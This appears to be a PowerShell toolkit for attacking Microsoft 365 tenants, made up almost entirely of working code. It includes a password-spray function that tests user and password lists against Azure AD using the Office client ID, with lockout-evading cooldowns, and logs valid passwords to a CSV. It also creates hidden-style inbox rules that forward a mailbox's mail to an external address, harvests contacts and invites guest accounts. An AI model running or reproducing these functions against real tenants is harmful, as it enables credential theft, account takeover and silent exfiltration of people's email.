function Get-AADToken {
    param(
        [String[]]$Scopes,
        $ClientID,
        $AppName,
        $UserName,
        $Credential,
        $ClientSecret,
        $RedirectUri,
        $TenantID,
        $Resource
    )

    #Use Organizations endpoint when sending credentials as part of request, otherwise common
    If ($username -or $Credential) {
        [uri]$authority = "https://login.microsoftonline.com/organizations/oauth2/authorize"
    }
    ElseIf ($ClientSecret) {
        [uri]$authority = "https://login.microsoftonline.com/" + $TenantID

    }
    else {
        [uri]$authority = "https://login.microsoftonline.com/common/oauth2/authorize"
    }
    if ($ClientSecret) {
		
        $clientcred = [Microsoft.Identity.Client.ClientCredential]::new($ClientSecret)
        $clientapp = [Microsoft.Identity.Client.ConfidentialClientApplication]::new($clientid, $authority, $RedirectUri, $clientcred, $null, $null)
        if ($Resource) {
            $scopes = $resource + "/.default"
        }
        else {
            Write-Warning "Changing scope to https://graph.microsoft.com/.default for Client Credentials Flow. Will not work for other APIs. Use Resource Parameter if not using Graph"
            $scopes = "https://graph.microsoft.com/.default"
        }

    }
    else {
        $clientapp = [Microsoft.Identity.Client.PublicClientApplication]::new($clientid, $authority)
    }
    #Build scopes array
    $appscopes = New-Object System.Collections.ObjectModel.Collection["string"]
    foreach ($s in $scopes) {
        $appscopes.Add($s)
    }
    #If Username parameter is specified, use WIA authentication with logged on account
    If ($username) {
        $authresult = $clientapp.AcquireTokenByIntegratedWindowsAuthAsync($appscopes, $username)
    }
    elseif ($Credential) {
        $authresult = $clientapp.AcquireTokenByUsernamePasswordAsync($appscopes, $Credential.Username, (ConvertTo-SecureString ($Credential.GetNetworkCredential().Password) -AsPlainText -Force))
    }
    elseif ($ClientSecret) {
        $authresult = $clientapp.AcquireTokenForClientAsync($appscopes)
    }
    else {
        if ($RedirectUri) {
            $clientapp.RedirectUri = $RedirectUri
        }
        $authresult = $clientapp.AcquireTokenAsync($appscopes)
    }
	
    return $authresult

	
}

function Get-RESTMailContacts {
    param(
        $Authentication,
        $Resource,
        $Username
    )
    
    #Create array for output
    $contactarray = New-Object System.Collections.ArrayList

    #Grab first 10 contacts

    if ($username) {

    }
    else {
        $contacturl = "https://graph.microsoft.com/v1.0/me/contacts"
    }
    $allcontacts = Invoke-RestMethod -Uri $contacturl -Method GET -Headers @{Authorization = $Authentication.CreateAuthorizationHeader() }
    $allcontacts = Invoke-RestMethod -Uri $contacturl -Method GET -Headers @{Authorization = $token }

    #Loop through returned contacts and 
    foreach ($c in $allcontacts.value) {
        $conobj = New-Object psobject
        $conobj | Add-Member -MemberType NoteProperty -Name "DisplayName" -Value $c.DisplayName
        $conobj | Add-Member -MemberType NoteProperty -Name "Title" -Value $c.jobTitle
        $conobj | Add-Member -MemberType NoteProperty -Name "Manager" -Value $c.manager
        $conobj | Add-Member -MemberType NoteProperty -Name "Address" -Value ($c.emailaddresses | Select-Object address).address
        [void]$contactarray.Add($conobj)
    }

    #Check for more than 10 contacts
    if ($allcontacts.'@odata.nextLink' -ne $null) {
        $morecontacts = $true
        $nextlink = $allcontacts.'@odata.nextLink'
    }
    while ($morecontacts -eq $true) {
        $nextcontacts = Invoke-RestMethod -Uri $nextlink -Method GET -Headers @{Authorization = $Authentication.CreateAuthorizationHeader() }

        #Loop through returned contacts and 
        foreach ($c in $nextcontacts.value) {
            $conobj = New-Object psobject
            $conobj | Add-Member -MemberType NoteProperty -Name "DisplayName" -Value $c.DisplayName
            $conobj | Add-Member -MemberType NoteProperty -Name "Title" -Value $c.jobTitle
            $conobj | Add-Member -MemberType NoteProperty -Name "Manager" -Value $c.manager
            $conobj | Add-Member -MemberType NoteProperty -Name "Address" -Value ($c.emailaddresses | Select-Object address).address
            [void]$contactarray.Add($conobj)
        }
        if ($nextcontacts.'@odata.nextLink' -eq $null) {
            $morecontacts = $false
        }
        else {
            $nextlink = $nextcontacts.'@odata.nextLink' 
        }
    }


    return $contactarray
}

function Add-RESTGuest {
    param(
        $Authentication,
        $GuestEmail,
        $RedirectUrl,
        $SendInviteMessage,
        $GuestDisplayName
    )
    $inviteurl = "https://graph.microsoft.com/v1.0/invitations"

    $newinvitebody = @{
        "invitedUserEmailAddress" = $GuestEmail;
        "inviteRedirectUrl"       = $RedirectUrl;
        "sendInvitationMessage"   = $SendInviteMessage;
        "invitedUserDisplayName"  = $GuestDisplayName
    }
    $newinvitebody = $newinvitebody | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $inviteurl -Method POST -Headers @{Authorization = $authentication.result.CreateAuthorizationHeader() } -ContentType application/json -Body $newinvitebody

}

function Invoke-MAPasswordSpray {
    param(
        [string[]]$Userlist,
        [string[]]$PasswordList,
        [int]$CoolDown,
        [int]$UserGroupSize,
        [int]$PasswordGroupSize
    )
    [uri]$authority = "https://login.microsoftonline.com/organizations/oauth2/authorize"
    #Microsoft Office Client ID gleaned from Outlook access token
    $clientid = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    #Build a client app for Microsoft Graph scopes
    $graphclientapp = [Microsoft.Identity.Client.PublicClientApplication]::new($clientid, $authority)
    $graphscopes = New-Object System.Collections.ObjectModel.Collection["string"]
    $graphscopes.Add("Mail.ReadWrite")

    #Build User Arrays
    $usergroups = [math]::Round([math]::Ceiling(($userlist.count / $UserGroupSize)), 0)
    $groupeduserlist = New-Object System.Collections.ArrayList
    $offset = 0
    foreach ($n in 0..($usergroups - 1)) {
        $groupcol = New-Object System.Collections.ArrayList
        foreach ($g in 0..($UserGroupSize - 1)) {
            [void]$groupcol.Add($userlist[$g + $offset])
                
        }
        [void]$groupeduserlist.Add($groupcol)
        $offset = $offset + $UserGroupSize
    }

    #Build Password Arrays
    $passwordgroups = [math]::Round([math]::Ceiling(($PasswordList.count / $PasswordGroupSize)), 0)
    $groupedpasswordlist = New-Object System.Collections.ArrayList
    $offset = 0
    foreach ($n in 0..($passwordgroups - 1)) {
        $groupcol = New-Object System.Collections.ArrayList
        foreach ($g in 0..($PasswordGroupSize - 1)) {
            [void]$groupcol.Add($passwordlist[$g + $offset])
                
        }
        [void]$groupedpasswordlist.Add($groupcol)
        $offset = $offset + $PasswordGroupSize
    } 

    #Create array for collecting results
    $sprayresults = New-Object System.Collections.ArrayList
    $groupcount = 1
    #Process Groups
    foreach ($usergroup in $groupeduserlist) {
        Write-Host "Processing User Group $($groupcount) of $($usergroups) Total Groups "
        foreach ($user in $usergroup) {    
            Write-Host "Checking user $($user)" -ForegroundColor Yellow
            foreach ($passwordgroup in $groupedpasswordlist) {
                foreach ($password in $Passwordgroup) {
                    $authresult = $graphclientapp.AcquireTokenByUsernamePasswordAsync($graphscopes, $user, (ConvertTo-SecureString $password -AsPlainText -Force))
                    #Wait for ASync task to complete - There is probably a more elegant way to do this
                    while ($authresult.IsCompleted -eq $false) {
                        Start-Sleep -Seconds 1
                    }
                    if ($authresult.IsFaulted -eq $false) {
                        $credstatus = "Success"
                        Write-Host "Success for $($user) with password $($password)" -ForegroundColor Green
                    }
                    else {
                        if ($authresult.Exception.InnerException -match "you must use multi-factor authentication to access") {
                            $credstatus = "Succes - MFA Required"
                            Write-Host "Success for $($user) with password $($password) - Multi-Factor Auth Required" -ForegroundColor Yellow
                        }
                        else {
                            $credstatus = "Failed"
                            Write-Host "Failure for $($user) with password $($password)" -ForegroundColor Red
                        }
                    }
                    $userobj = New-Object psobject
                    $userobj | Add-Member -MemberType NoteProperty -Name "User" -Value $user
                    $userobj | Add-Member -MemberType NoteProperty -Name "CredentialStatus" -Value $credstatus
                    $userobj | Add-Member -MemberType NoteProperty -Name "Password" -Value $password
                    [void]$sprayresults.Add($userobj)
                    $userobj | Export-Csv SprayResults.csv -NoTypeInformation -Append
                }
                Write-Host "Finished Processing Password Group - Starting $($cooldown) Second Cooldown"
                Start-Sleep -Seconds $Cooldown
            }
        }
        Write-Host "Finished Processing User Group $($groupcount) - Starting $($cooldown) Second Cooldown"
        Start-Sleep -Seconds $CoolDown
        $groupcount++

    }

}

function New-RESTInboxRule {
    param(
        $Authentication,
        $Mailbox,
        $RuleDisplayName,
        $ForwardToSMTP,
        $ForwardToDisplay

    )
    
    $ruleurl = "https://outlook.office.com/api/beta/users/$($Mailbox)/mailFolders/inbox/messageRules"
    $rulebody = @{
        "DisplayName" = $RuleDisplayName;
        "Sequence"    = 1;
        "IsEnabled"   = $true;
        "Actions"     = @{
            "ForwardTo"           = @(
                @{"EmailAddress" = @{
                        "Name"    = $ForwardToDisplay;
                        "Address" = $ForwardToSMTP
                    }
                }
            );
            "StopProcessingRules" = $true
        }
    
    }
    $rulebody = $rulebody | ConvertTo-Json -Depth 10
    $ruleadd = Invoke-RestMethod -Uri $ruleurl -Method POST -Headers @{Authorization = $Authentication.result.CreateAuthorizationHeader() } -ContentType application/json -Body $rulebody
    

}
